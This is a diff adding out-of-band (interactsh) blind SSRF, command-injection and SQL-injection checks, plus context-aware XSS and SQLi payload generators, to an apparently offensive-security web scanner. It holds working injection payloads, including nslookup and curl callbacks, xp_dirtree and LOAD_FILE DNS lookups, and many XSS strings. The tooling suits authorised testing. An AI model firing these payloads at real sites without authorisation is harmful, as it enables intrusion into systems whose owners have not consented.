@@ -4542,3 +4542,439 @@ def scan_dns_rebinding_ssrf(crawl_data):
                         break
                 except: continue
     return findings
+
+
+# ---------------------------------------------------------------------------
+# OOB (Out-of-Band) Engine — interactsh for blind vuln confirmation
+# ---------------------------------------------------------------------------
+
+import threading as _threading
+import subprocess as _subprocess
+
+class OOBServer:
+    """Manages interactsh-client for OOB DNS/HTTP callbacks."""
+
+    def __init__(self):
+        self.domain = None
+        self.interactions = []
+        self._proc = None
+        self._thread = None
+        self._lock = _threading.Lock()
+        self._ready = _threading.Event()
+
+    def start(self):
+        """Auto-install and start interactsh-client."""
+        path = _subprocess.run(["which","interactsh-client"],
+                               capture_output=True, text=True).stdout.strip()
+        if not path:
+            try:
+                import shutil, os
+                go_bin = os.path.expanduser("~/go/bin")
+                _subprocess.run(
+                    ["go","install","github.com/projectdiscovery/interactsh/cmd/interactsh-client@latest"],
+                    capture_output=True, timeout=120
+                )
+                path = os.path.join(go_bin, "interactsh-client")
+            except Exception:
+                return False
+        if not path or not _subprocess.run(["test","-x",path], shell=False).returncode == 0:
+            import shutil
+            path = shutil.which("interactsh-client")
+        if not path:
+            return False
+        try:
+            self._proc = _subprocess.Popen(
+                [path, "-json", "-v"],
+                stdout=_subprocess.PIPE, stderr=_subprocess.PIPE,
+                text=True
+            )
+            self._thread = _threading.Thread(target=self._read_output, daemon=True)
+            self._thread.start()
+            # Wait up to 10s for domain registration
+            self._ready.wait(timeout=10)
+            return self.domain is not None
+        except Exception:
+            return False
+
+    def _read_output(self):
+        import json as _json
+        for line in self._proc.stdout:
+            line = line.strip()
+            if not line:
+                continue
+            try:
+                data = _json.loads(line)
+                if "interactsh-domain" in data and not self.domain:
+                    self.domain = data["interactsh-domain"]
+                    self._ready.set()
+                if "protocol" in data:
+                    with self._lock:
+                        self.interactions.append(data)
+            except Exception:
+                # Plain text domain line
+                if ".oast." in line or ".interactsh." in line:
+                    self.domain = line.strip()
+                    self._ready.set()
+
+    def poll(self, identifier, timeout=8):
+        """Wait up to timeout seconds for a callback containing identifier."""
+        import time as _time
+        deadline = _time.time() + timeout
+        while _time.time() < deadline:
+            with self._lock:
+                for i in self.interactions:
+                    if identifier in str(i):
+                        return i
+            _time.sleep(0.5)
+        return None
+
+    def unique_id(self):
+        """Generate a unique subdomain for tracking a specific payload."""
+        import uuid as _uuid
+        return _uuid.uuid4().hex[:8]
+
+    def stop(self):
+        if self._proc:
+            try:
+                self._proc.terminate()
+            except Exception:
+                pass
+
+# Global OOB instance — started once per scan if available
+_OOB = OOBServer()
+_OOB_ACTIVE = False
+
+def oob_start():
+    global _OOB_ACTIVE
+    _OOB = OOBServer()
+    _OOB_ACTIVE = _OOB.start()
+    return _OOB if _OOB_ACTIVE else None
+
+def scan_blind_ssrf_oob(crawl_data, oob=None):
+    """Blind SSRF confirmed via OOB DNS callback — the gold standard."""
+    findings = []
+    if not oob or not oob.domain:
+        return findings
+    fetch_params = ("url","uri","link","src","source","fetch","request","proxy",
+                    "redirect","image","avatar","webhook","callback","endpoint","host","dest")
+    for url, params in crawl_data.get("params", {}).items():
+        for p in params:
+            if p.lower() not in fetch_params:
+                continue
+            uid = oob.unique_id()
+            payload = f"http://{uid}.{oob.domain}/"
+            try:
+                parsed = urllib.parse.urlparse(url)
+                qs = urllib.parse.parse_qs(parsed.query)
+                qs[p] = [payload]
+                test_url = parsed._replace(query=urllib.parse.urlencode(qs, doseq=True)).geturl()
+                _S.get(test_url, timeout=5)
+                hit = oob.poll(uid, timeout=8)
+                if hit:
+                    findings.append({"type": "Blind SSRF (OOB Confirmed)",
+                                     "severity": "critical", "url": test_url,
+                                     "detail": f"DNS callback received for param '{p}' — SSRF confirmed via interactsh",
+                                     "template": "apex-ssrf-oob"})
+            except: continue
+    # Also test forms
+    for form in crawl_data.get("forms", []):
+        for inp in form.get("inputs", []):
+            if inp.get("name","").lower() not in fetch_params: continue
+            uid = oob.unique_id()
+            payload = f"http://{uid}.{oob.domain}/"
+            try:
+                data = {i.get("name","f"): i.get("value","test") for i in form.get("inputs",[])}
+                data[inp["name"]] = payload
+                _S.post(form["action"], data=data, timeout=5)
+                hit = oob.poll(uid, timeout=8)
+                if hit:
+                    findings.append({"type": "Blind SSRF via Form (OOB Confirmed)",
+                                     "severity": "critical", "url": form["action"],
+                                     "detail": f"DNS callback for field '{inp['name']}' — SSRF confirmed",
+                                     "template": "apex-ssrf-oob"})
+            except: continue
+    return findings
+
+
+def scan_blind_cmdi_oob(crawl_data, oob=None):
+    """Blind CMDi confirmed via OOB DNS — nslookup/curl callback."""
+    findings = []
+    if not oob or not oob.domain:
+        return findings
+    for form in crawl_data.get("forms", []):
+        if form.get("method","").upper() != "POST": continue
+        for inp in form.get("inputs", []):
+            if inp.get("type") in ("submit","hidden","button","password"): continue
+            uid = oob.unique_id()
+            payloads = [
+                f";nslookup {uid}.{oob.domain}",
+                f"|nslookup {uid}.{oob.domain}",
+                f"`nslookup {uid}.{oob.domain}`",
+                f"$(nslookup {uid}.{oob.domain})",
+                f";curl http://{uid}.{oob.domain}/",
+            ]
+            for payload in payloads:
+                try:
+                    data = {i.get("name","f"): i.get("value","127.0.0.1") for i in form.get("inputs",[])}
+                    data[inp["name"]] = "127.0.0.1" + payload
+                    _S.post(form["action"], data=data, timeout=5)
+                    hit = oob.poll(uid, timeout=8)
+                    if hit:
+                        findings.append({"type": "Blind CMDi (OOB Confirmed)",
+                                         "severity": "critical", "url": form["action"],
+                                         "detail": f"DNS callback for field '{inp['name']}' — CMDi confirmed via interactsh",
+                                         "template": "apex-cmdi-oob"})
+                        break
+                except: continue
+    return findings
+
+
+def scan_blind_sqli_oob_confirmed(crawl_data, oob=None):
+    """Blind SQLi confirmed via OOB DNS — LOAD_FILE/xp_dirtree DNS callbacks."""
+    findings = []
+    if not oob or not oob.domain:
+        return findings
+    oob_payloads = [
+        ("MySQL",  lambda uid: f"' AND LOAD_FILE(CONCAT('\\\\\\\\\\\\\\\\',version(),'.{uid}.{oob.domain}\\\\\\\\a'))-- -"),
+        ("MSSQL",  lambda uid: f"'; EXEC master..xp_dirtree '//{uid}.{oob.domain}/a'-- -"),
+        ("Oracle", lambda uid: f"' UNION SELECT UTL_HTTP.REQUEST('http://{uid}.{oob.domain}/') FROM DUAL-- -"),
+    ]
+    for url, params in crawl_data.get("params", {}).items():
+        for p in params:
+            for db, payload_fn in oob_payloads:
+                uid = oob.unique_id()
+                try:
+                    parsed = urllib.parse.urlparse(url)
+                    qs = urllib.parse.parse_qs(parsed.query)
+                    qs[p] = [payload_fn(uid)]
+                    test_url = parsed._replace(query=urllib.parse.urlencode(qs, doseq=True)).geturl()
+                    _S.get(test_url, timeout=5)
+                    hit = oob.poll(uid, timeout=8)
+                    if hit:
+                        findings.append({"type": f"Blind SQLi OOB Confirmed ({db})",
+                                         "severity": "critical", "url": test_url,
+                                         "detail": f"DNS callback for param '{p}' — {db} SQLi confirmed",
+                                         "template": "apex-sqli-oob-confirmed"})
+                        break
+                except: continue
+    return findings
+
+
+# ---------------------------------------------------------------------------
+# Context-Aware Payload Mutation Engine
+# Detects reflection context and mutates payloads to match — beats Burp's
+# default scanner by adapting to HTML attr, JS string, URL param, JSON value
+# ---------------------------------------------------------------------------
+
+def detect_reflection_context(response_text, canary):
+    """Detect where a canary value is reflected and return context type."""
+    if canary not in response_text:
+        return None
+    idx = response_text.find(canary)
+    before = response_text[max(0, idx-100):idx]
+    after = response_text[idx+len(canary):idx+len(canary)+100]
+
+    # JS string context: canary inside quotes in a script block
+    if re.search(r'<script[^>]*>.*$', before, re.DOTALL):
+        if re.search(r'["\']$', before.rstrip()):
+            return "js_string"
+        return "js_bare"
+
+    # HTML attribute context: canary inside an attribute value
+    if re.search(r'<[a-zA-Z][^>]*\s[a-zA-Z-]+=["\']\s*$', before):
+        quote = '"' if before.rstrip().endswith('"') else "'"
+        return f"html_attr_{quote}"
+
+    # URL context: canary inside href/src/action
+    if re.search(r'(?:href|src|action|data-url)=["\'][^"\']*$', before):
+        return "url_attr"
+
+    # JSON value context
+    if re.search(r'["\']:\s*["\']?$', before.rstrip()):
+        return "json_value"
+
+    # HTML tag context: canary between tags
+    if re.search(r'>\s*$', before.rstrip()) and re.search(r'^\s*<', after.lstrip()):
+        return "html_text"
+
+    return "html_text"  # default
+
+
+def mutate_xss_for_context(context):
+    """Return XSS payloads optimized for the detected reflection context."""
+    if context == "js_string":
+        return [
+            '"-alert(1)-"',
+            "'-alert(1)-'",
+            '\\"-alert(1)-\\"',
+            '";alert(1)//',
+            "';alert(1)//",
+            '${alert(1)}',
+        ]
+    elif context == "js_bare":
+        return [
+            'alert(1)',
+            ';alert(1)//',
+            '\nalert(1)\n',
+        ]
+    elif context and context.startswith("html_attr_"):
+        q = context.split("_")[-1]
+        oq = "'" if q == '"' else '"'
+        return [
+            f'{q}><script>alert(1)</script>',
+            f'{q} onmouseover=alert(1) x={q}',
+            f'{q} autofocus onfocus=alert(1) {q}',
+            f'{oq} onload=alert(1) {oq}',
+        ]
+    elif context == "url_attr":
+        return [
+            'javascript:alert(1)',
+            'data:text/html,<script>alert(1)</script>',
+            'javascript:alert(1)//',
+        ]
+    elif context == "json_value":
+        return [
+            '<script>alert(1)</script>',
+            '"-alert(1)-"',
+            '\\u003cscript\\u003ealert(1)\\u003c/script\\u003e',
+        ]
+    else:  # html_text
+        return [
+            '<script>alert(1)</script>',
+            '<img src=x onerror=alert(1)>',
+            '<svg onload=alert(1)>',
+            '<details open ontoggle=alert(1)>',
+        ]
+
+
+def mutate_sqli_for_context(context, original_value="1"):
+    """Return SQLi payloads adapted to value context (numeric vs string)."""
+    is_numeric = original_value.strip().lstrip('-').isdigit()
+    if is_numeric:
+        return [
+            f"{original_value} AND 1=1-- -",
+            f"{original_value} AND 1=2-- -",
+            f"{original_value} AND SLEEP(4)-- -",
+            f"{original_value} UNION SELECT NULL-- -",
+            f"{original_value} AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))-- -",
+        ]
+    else:
+        return [
+            f"{original_value}' AND '1'='1",
+            f"{original_value}' AND '1'='2",
+            f"{original_value}' AND SLEEP(4)-- -",
+            f"{original_value}' UNION SELECT NULL-- -",
+            f"{original_value}' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))-- -",
+        ]
+
+
+def scan_context_aware_xss(crawl_data):
+    """XSS scanner that detects reflection context and uses optimal payloads."""
+    findings = []
+    canary = f"apexcanary{int(time.time()) % 100000}"
+
+    for url, params in crawl_data.get("params", {}).items():
+        for p in params:
+            # First probe: inject canary to detect context
+            try:
+                parsed = urllib.parse.urlparse(url)
+                qs = urllib.parse.parse_qs(parsed.query)
+                qs[p] = [canary]
+                probe_url = parsed._replace(query=urllib.parse.urlencode(qs, doseq=True)).geturl()
+                r = _S.get(probe_url, timeout=_TIMEOUT)
+                context = detect_reflection_context(r.text, canary)
+                if not context:
+                    continue
+                # Now use context-specific payloads
+                for payload in mutate_xss_for_context(context):
+                    qs[p] = [payload]
+                    test_url = parsed._replace(query=urllib.parse.urlencode(qs, doseq=True)).geturl()
+                    r2 = _S.get(test_url, timeout=_TIMEOUT)
+                    if payload in r2.text and "text/html" in r2.headers.get("content-type",""):
+                        findings.append({"type": f"XSS ({context} context)",
+                                         "severity": "high", "url": test_url,
+                                         "detail": f"Context-aware XSS in param '{p}' [{context}]: {payload[:50]}",
+                                         "template": "apex-xss-ctx"})
+                        break
+            except: continue
+
+    # Forms
+    for form in crawl_data.get("forms", []):
+        action = form.get("action","")
+        if not action: continue
+        for inp in form.get("inputs",[]):
+            if inp.get("type") in ("submit","hidden","button","file"): continue
+            name = inp.get("name","")
+            if not name: continue
+            try:
+                data = {i.get("name","f"): i.get("value","test") for i in form.get("inputs",[])}
+                data[name] = canary
+                if form.get("method","GET").upper() == "POST":
+                    r = _S.post(action, data=data, timeout=_TIMEOUT)
+                else:
+                    r = _S.get(action, params=data, timeout=_TIMEOUT)
+                context = detect_reflection_context(r.text, canary)
+                if not context:
+                    continue
+                for payload in mutate_xss_for_context(context):
+                    data[name] = payload
+                    if form.get("method","GET").upper() == "POST":
+                        r2 = _S.post(action, data=data, timeout=_TIMEOUT)
+                    else:
+                        r2 = _S.get(action, params=data, timeout=_TIMEOUT)
+                    if payload in r2.text and "text/html" in r2.headers.get("content-type",""):
+                        findings.append({"type": f"XSS Form ({context} context)",
+                                         "severity": "high", "url": action,
+                                         "detail": f"Context-aware XSS in field '{name}' [{context}]",
+                                         "template": "apex-xss-ctx"})
+                        break
+            except: continue
+    return findings
+
+
+def scan_context_aware_sqli(crawl_data):
+    """SQLi scanner that adapts payloads to numeric vs string context."""
+    findings = []
+    error_patterns = ["sql syntax","mysql_fetch","ora-","postgresql","sqlite",
+                      "syntax error","unclosed quotation","you have an error in your sql",
+                      "warning: mysql","pg_query","division by zero","column count"]
+
+    for url, params in crawl_data.get("params", {}).items():
+        parsed = urllib.parse.urlparse(url)
+        orig_qs = urllib.parse.parse_qs(parsed.query)
+        for p in params:
+            orig_val = orig_qs.get(p, ["1"])[0]
+            for payload in mutate_sqli_for_context(None, orig_val):
+                try:
+                    qs = dict(orig_qs)
+                    qs[p] = [payload]
+                    test_url = parsed._replace(query=urllib.parse.urlencode(qs, doseq=True)).geturl()
+                    start = time.time()
+                    r = _S.get(test_url, timeout=12)
+                    elapsed = time.time() - start
+                    body = r.text.lower()
+                    if any(e in body for e in error_patterns):
+                        findings.append({"type": "SQLi (Context-Aware, Error-Based)",
+                                         "severity": "critical", "url": test_url,
+                                         "detail": f"SQL error via param '{p}' (value type: {'numeric' if orig_val.isdigit() else 'string'})",
+                                         "template": "apex-sqli-ctx"})
+                        break
+                    if "SLEEP(4)" in payload and elapsed >= 4:
+                        findings.append({"type": "SQLi (Context-Aware, Time-Based)",
+                                         "severity": "critical", "url": test_url,
+                                         "detail": f"Time-based SQLi in param '{p}' — {elapsed:.1f}s delay",
+                                         "template": "apex-sqli-ctx"})
+                        break
+                    # Boolean-based: compare AND 1=1 vs AND 1=2
+                    if "1=1" in payload:
+                        qs[p] = [payload.replace("1=1","1=2")]
+                        false_url = parsed._replace(query=urllib.parse.urlencode(qs, doseq=True)).geturl()
+                        r2 = _S.get(false_url, timeout=_TIMEOUT)
+                        if abs(len(r.text) - len(r2.text)) > 50:
+                            findings.append({"type": "SQLi (Context-Aware, Boolean-Based)",
+                                             "severity": "critical", "url": test_url,
+                                             "detail": f"Boolean SQLi in param '{p}' — response diff {abs(len(r.text)-len(r2.text))}b",
+                                             "template": "apex-sqli-ctx"})
+                            break
+                except: continue
+    return findings
